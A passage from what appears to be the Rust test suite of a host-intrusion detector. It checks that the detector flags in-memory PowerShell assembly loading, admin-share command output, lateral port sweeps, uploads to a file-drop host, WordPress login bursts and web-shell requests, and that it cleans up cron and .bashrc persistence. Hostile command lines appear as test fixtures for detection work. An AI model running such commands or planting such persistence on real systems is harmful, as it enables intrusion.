        ("powershell -c [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)", "a program loaded straight from memory"),
        ("cmd.exe /Q /c echo whoami ^> \\\\127.0.0.1\\C$\\__output 2^>^&1", "output written to this machine's own administrative share, the way remote-execution tools work"),
    ] {
        assert!(labels(line).contains(&label), "{line}: {:?}", labels(line));
    }
    for line in ["wscript.exe C:\\Scripts\\logon.vbs", "powershell -c Get-Process", "robocopy \\\\fileserver\\c$\\data d:\\backup", "powershell -c [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')"] {
        assert!(labels(line).is_empty(), "{line}: {:?}", labels(line));
    }
    // Looking for the next machine: fifteen neighbours tried on the ports one machine administers another through.
    let sweep = |machines: u8, port: u16| -> View {
        let mut view = windows("powershell.exe", "wsmprovhost.exe", "powershell.exe -c Invoke-Command");
        view.contacts = (1..=machines).map(|last| (format!("10.0.5.{last}"), port, vec![T - 5.0])).collect();
        view
    };
    assert!(judged(&sweep(20, 445)).1.contains(&"lateral_sweep".to_string()));
    assert!(judged(&sweep(20, 5985)).1.contains(&"lateral_sweep".to_string()));
    assert!(!judged(&sweep(5, 445)).1.contains(&"lateral_sweep".to_string()), "a few file servers");
    assert!(!judged(&sweep(40, 443)).1.contains(&"lateral_sweep".to_string()), "web traffic to many machines");
    let mut old = sweep(20, 445);
    for contact in old.contacts.iter_mut() {
        contact.2 = vec![T - 3600.0];
    }
    assert!(!judged(&old).1.contains(&"lateral_sweep".to_string()), "an hour ago");
    let mut upload = windows("powershell.exe", "wscript.exe", "powershell.exe");
    upload.remotes = vec![Remote { address: "93.184.216.34".into(), port: 443, names: vec!["bashupload.com".into()] }];
    assert!(judged(&upload).1.contains(&"drop_or_tunnel_host".to_string()));
}

#[test]
fn what_is_done_to_a_wordpress_site_shows_in_its_own_log() {
    use garrett::web::WebWatch;
    use std::io::Write;
    let base = std::env::temp_dir().join(format!("garrett-wider-wp-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    std::fs::create_dir_all(base.join("www")).unwrap();
    let log = base.join("access.log");
    std::fs::write(&log, b"an earlier line\n").unwrap();
    let mut watch = WebWatch::new(vec![log.to_string_lossy().into_owned()], vec![base.join("www").to_string_lossy().into_owned()]);
    assert!(watch.poll(T).0.is_empty());
    let line = |client: &str, method: &str, target: &str, status: u16| format!("{client} - - [16/Nov/2026:10:00:00 +0000] \"{method} {target} HTTP/1.1\" {status} 512\n");
    let mut text = String::new();
    for _ in 0..40 {
        text += &line("198.51.100.20", "POST", "/xmlrpc.php", 200);
    }
    text += &line("198.51.100.21", "POST", "/xmlrpc.php", 200);
    text += &line("198.51.100.22", "GET", "/wp-json/platformist-quadendpointer-abcdef/v1/abcdefab", 200);
    text += &line("198.51.100.23", "GET", "/wp-json/wp/v2/posts", 200);
    text += &line("198.51.100.23", "GET", "/wp-json/contact-form/v1/contact-forms/feedback", 200);
    text += &line("198.51.100.24", "GET", "/wp-admin/admin-ajax.php?action=ajjs_run", 200);
    text += &line("198.51.100.25", "POST", "/wp-admin/admin-ajax.php?action=heartbeat", 200);
    std::fs::OpenOptions::new().append(true).open(&log).unwrap().write_all(text.as_bytes()).unwrap();
    let (clients, _) = watch.poll(T + 1.0);
    let said = |client: &str| -> Vec<String> { clients.iter().filter(|(name, _)| name == client).flat_map(|(_, marks)| marks.iter().map(|(id, _, text)| format!("{id}: {text}"))).collect() };
    assert!(said("198.51.100.20").iter().any(|text| text.starts_with("web_login_burst")), "{:?}", said("198.51.100.20"));
    assert!(said("198.51.100.21").is_empty(), "one call to it is how some sites are used");
    assert_eq!(said("198.51.100.22"), vec!["web_shell_request: was answered 1 time(s) on an address shaped like a planted plugin's".to_string()]);
    assert!(said("198.51.100.23").is_empty(), "{:?}", said("198.51.100.23"));
    assert!(said("198.51.100.24").iter().any(|text| text.starts_with("web_shell_request")), "{:?}", said("198.51.100.24"));
    assert!(said("198.51.100.25").is_empty());
    let _ = std::fs::remove_dir_all(&base);
}

/// A dropped program, a scheduled job and a shell startup line, cleaned up under one case that the owner then
/// calls theirs. The same three written again are left alone, under any case; another program put in the same
/// place is not.
#[cfg(unix)]
#[test]
fn what_was_cleaned_up_under_a_case_the_owner_trusts_is_never_cleaned_up_again() {
    use garrett::clean::{Cleaner, StartupWatch};
    let base = std::env::temp_dir().join(format!("garrett-trust-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    let (state, root) = (base.join("state"), base.to_string_lossy().into_owned());
    let program = format!("{root}/tmp/lm/agent");
    let (job, line) = (format!("*/5 * * * * root {program} 5\n"), format!("({program} 5 >/dev/null 2>&1 &)"));
    let stage = |body: &[u8]| {
        for folder in ["tmp/lm", "etc/cron.d", "root", "state"] {
            std::fs::create_dir_all(base.join(folder)).unwrap();
        }
        std::fs::write(base.join("tmp/lm/agent"), body).unwrap();
        std::fs::write(base.join("etc/cron.d/lm"), &job).unwrap();
        std::fs::write(base.join("root/.bashrc"), format!("alias ll='ls -l'\n{line}\n")).unwrap();
    };
    let now = 1_800_000_000.0;
    let said = |steps: &[Value]| -> Vec<String> { steps.iter().map(|step| format!("{} {}", step["action"].as_str().unwrap(), step["kind"].as_str().unwrap())).collect() };
    let cleaner = Cleaner::new("linux", &state, Some(&base), false);
    stage(b"\x7fELF the program");
    let first = cleaner.clean(&"a".repeat(32), std::slice::from_ref(&program), &[], 0.0, now);
    assert_eq!(said(&first), ["quarantined scheduled job", "disabled shell startup file", "quarantined program file"]);
    assert!(!base.join("tmp/lm/agent").exists() && !base.join("etc/cron.d/lm").exists());

    // The owner says it is theirs. What was put away stays put away (restore is for that), and is remembered.
    assert_eq!(cleaner.allow(&"a".repeat(32)), 3);
    assert!(!base.join("tmp/lm/agent").exists());
    let mut watch = StartupWatch::new("linux", &state, Some(&base));
    assert!(watch.poll().is_empty());

    // The same program, job and line are written again: not news, and nothing is cleaned up, under any case.
    std::thread::sleep(std::time::Duration::from_millis(20));
    stage(b"\x7fELF the program");
    assert_eq!(watch.poll(), Vec::new(), "the startup watch took the owner's own entries for news");
    assert!(cleaner.clean(&"b".repeat(32), std::slice::from_ref(&program), &[], 0.0, now).is_empty());
    assert!(base.join("tmp/lm/agent").exists() && base.join("etc/cron.d/lm").exists());
    assert_eq!(std::fs::read_to_string(base.join("root/.bashrc")).unwrap(), format!("alias ll='ls -l'\n{line}\n"));

    // Another program in the same place is not the owner's: it goes, and the owner's entries stay.
    std::fs::write(base.join("tmp/lm/agent"), b"\x7fELF another program").unwrap();
    assert_eq!(said(&cleaner.clean(&"c".repeat(32), std::slice::from_ref(&program), &[], 0.0, now)), ["quarantined program file"]);
    assert!(!base.join("tmp/lm/agent").exists() && base.join("etc/cron.d/lm").exists());
    let _ = std::process::Command::new("chmod").args(["-R", "u+rwx", &root]).status();
    let _ = std::fs::remove_dir_all(&base);
}
